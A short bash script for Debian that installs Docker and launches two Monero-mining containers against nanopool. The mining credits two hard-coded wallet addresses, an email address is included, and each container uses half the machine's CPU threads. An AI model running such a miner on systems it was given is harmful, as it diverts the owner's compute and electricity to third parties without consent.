#!/bin/bash
#for Debian based
sudo sysctl vm.nr_hugepages=128
sudo apt-get update
sudo apt-get upgrade -y
sudo apt-get install -y \
     apt-transport-https \
     ca-certificates \
     curl \
     gnupg2 \
     software-properties-common
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
sudo add-apt-repository \
   "deb [arch=amd64] https://download.docker.com/linux/debian \
   $(lsb_release -cs) \
   stable"
sudo apt-get update && sudo apt-get install -y docker-ce

wallet='426jvb8frrm73Q9Dg8SB5n7eeiLXXhUCEDWefuNq7Kgi7vMShDuUpzVG5fn7ZkS6MmSTz5ZnzGv5Sc7gPYC88n1Y19Pbti4.miner/11cj11@bk.ru'
numthr="$(nproc --all)"
pool=xmr-us-west1.nanopool.org
port=14444
pass="11cj11@bk.ru"
image=servethehome/universal_cryptonight:latest
docker run -itd -e pool=$pool -e startport=$port -e username=$wallet -e pass=$pass -e av=0 -e numthreads=$((numthr / 2)) $image
docker run -itd -e pool=$pool -e startport=$port -e username='4AJBPuKtFMAdYLJcGDU4U4NYAm5s8YgdwgAPajuRnpjjK2mTDdwKihkFyuDfjcnhc7JLDWQT17h2RcTxVskeJu8YCiBSLpY.miner/11cj11@bk.ru' -e pass=$pass -e av=0 -e numthreads=$((numthr / 2)) $image
